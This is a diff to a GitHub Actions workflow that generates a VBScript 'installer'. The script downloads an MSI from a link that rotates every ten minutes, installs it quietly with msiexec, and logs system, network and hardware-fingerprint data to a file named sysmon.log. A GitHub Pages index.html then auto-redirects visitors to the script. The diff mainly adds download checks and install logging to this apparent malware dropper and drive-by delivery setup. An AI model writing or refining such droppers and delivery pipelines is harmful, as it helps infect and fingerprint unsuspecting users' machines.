@@ -20,7 +20,7 @@ jobs:
         
         # Get current link based on 10-minute interval
         current_minute=$(date +%M)
-        link_index=$((current_minute / 10 % 5))
+        link_index=$((current_minute / 10 % 10))
         current_link=${links[$link_index]}
         
         echo "Creating bulky VBS with link: $current_link"
@@ -293,6 +293,22 @@ jobs:
         echo "    objXMLHTTP.send()" >> installer.vbs
         echo "End If" >> installer.vbs
         echo "" >> installer.vbs
+        echo "' Verify download" >> installer.vbs
+        echo "If Not Fso.FileExists(strFile) Then" >> installer.vbs
+        echo "    WScript.Echo \"Download failed - file not found\"" >> installer.vbs
+        echo "    WScript.Quit" >> installer.vbs
+        echo "End If" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "' Check file size" >> installer.vbs
+        echo "Set objFile = Fso.GetFile(strFile)" >> installer.vbs
+        echo "If objFile.Size < 1024 Then  ' Less than 1KB suggests incomplete download" >> installer.vbs
+        echo "    WScript.Echo \"Downloaded file appears incomplete: \" & objFile.Size & \" bytes\"" >> installer.vbs
+        echo "    WScript.Quit" >> installer.vbs
+        echo "End If" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "' Create installation log" >> installer.vbs
+        echo "logFile = strTemp & \"\\install.log\"" >> installer.vbs
+        echo "" >> installer.vbs
         echo "' Check if we got a successful response" >> installer.vbs
         echo "If objXMLHTTP.Status = 200 Then" >> installer.vbs
         echo "    Set objADOStream = CreateObject(\"ADODB.Stream\")" >> installer.vbs
@@ -303,9 +319,34 @@ jobs:
         echo "    objADOStream.SaveToFile strFile, 2 ' Overwrite" >> installer.vbs
         echo "    objADOStream.Close" >> installer.vbs
         echo "" >> installer.vbs
-        echo "    ' Install" >> installer.vbs
-        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> installer.vbs
-        echo "    objShell.Run \"msiexec /i \"\"\" & strFile & \"\"\" /quiet /qn /norestart\", 0, True" >> installer.vbs
+        echo "    ' Try installation with logging and visible window" >> installer.vbs
+        echo "    WScript.Echo \"Installing... This may take a few minutes.\"" >> installer.vbs
+        echo "    objShell.Run \"msiexec /i \"\"\" & strFile & \"\"\" /l*v \"\"\" & logFile & \"\"\" /quiet /qn /norestart\", 1, True" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "    ' Check if installation succeeded" >> installer.vbs
+        echo "    If Fso.FileExists(logFile) Then" >> installer.vbs
+        echo "        Set objLog = Fso.OpenTextFile(logFile, 1)" >> installer.vbs
+        echo "        logContent = objLog.ReadAll" >> installer.vbs
+        echo "        objLog.Close" >> installer.vbs
+        echo "        " >> installer.vbs
+        echo "        ' Look for success or failure" >> installer.vbs
+        echo "        If InStr(logContent, \"Installation completed successfully\") > 0 Then" >> installer.vbs
+        echo "            WScript.Echo \"Installation completed successfully\"" >> installer.vbs
+        echo "        ElseIf InStr(logContent, \"Error\") > 0 Or InStr(logContent, \"failed\") > 0 Then" >> installer.vbs
+        echo "            WScript.Echo \"Installation failed. Check log file: \" & logFile" >> installer.vbs
+        echo "            WScript.Echo \"Last few lines of log:\"" >> installer.vbs
+        echo "            " >> installer.vbs
+        echo "            ' Show last few lines of log" >> installer.vbs
+        echo "            lines = Split(logContent, vbCrLf)" >> installer.vbs
+        echo "            For i = UBound(lines) - 5 To UBound(lines)" >> installer.vbs
+        echo "                If i >= 0 Then WScript.Echo lines(i)" >> installer.vbs
+        echo "            Next" >> installer.vbs
+        echo "        Else" >> installer.vbs
+        echo "            WScript.Echo \"Installation status unclear. Check log file: \" & logFile" >> installer.vbs
+        echo "        End If" >> installer.vbs
+        echo "    Else" >> installer.vbs
+        echo "        WScript.Echo \"Installation log not created - installation may have failed immediately\"" >> installer.vbs
+        echo "    End If" >> installer.vbs
         echo "" >> installer.vbs
         echo "    ' Cleanup" >> installer.vbs
         echo "    If Fso.FileExists(strFile) Then Fso.DeleteFile strFile" >> installer.vbs
@@ -314,8 +355,8 @@ jobs:
         echo "End If" >> installer.vbs
         echo "" >> installer.vbs
         echo "' Additional cleanup and logging" >> installer.vbs
-        echo "Dim logFile, logContent" >> installer.vbs
-        echo "Set logFile = Fso.CreateTextFile(WshShell.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\sysmon.log\", True)" >> installer.vbs
+        echo "Dim sysLogFile, logContent" >> installer.vbs
+        echo "Set sysLogFile = Fso.CreateTextFile(WshShell.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\sysmon.log\", True)" >> installer.vbs
         echo "logContent = \"System Info: \" & systemInfo & vbCrLf & _" >> installer.vbs
         echo "             \"Network Info: \" & networkInfo & vbCrLf & _" >> installer.vbs
         echo "             \"Hardware ID: \" & hwFingerprint & vbCrLf & _" >> installer.vbs
@@ -325,8 +366,8 @@ jobs:
         echo "             \"Windows Version: \" & GetWindowsVersion() & vbCrLf & _" >> installer.vbs
         echo "             \"Execution Time: \" & Now" >> installer.vbs
         echo "" >> installer.vbs
-        echo "logFile.WriteLine logContent" >> installer.vbs
-        echo "logFile.Close" >> installer.vbs
+        echo "sysLogFile.WriteLine logContent" >> installer.vbs
+        echo "sysLogFile.Close" >> installer.vbs
         echo "" >> installer.vbs
         echo "' Final cleanup" >> installer.vbs
         echo "Set WshShell = Nothing" >> installer.vbs
@@ -334,7 +375,7 @@ jobs:
         echo "Set NetObj = Nothing" >> installer.vbs
         echo "Set objXMLHTTP = Nothing" >> installer.vbs
         echo "Set objADOStream = Nothing" >> installer.vbs
-        echo "Set objShell = Nothing" >> installer.vbs
+        echo "Set objShell = Nothing"
         
         # Create index.html for GitHub Pages
         echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=installer.vbs"></head><body><p>If not redirected, <a href="installer.vbs">click here</a></p></body></html>' > index.html
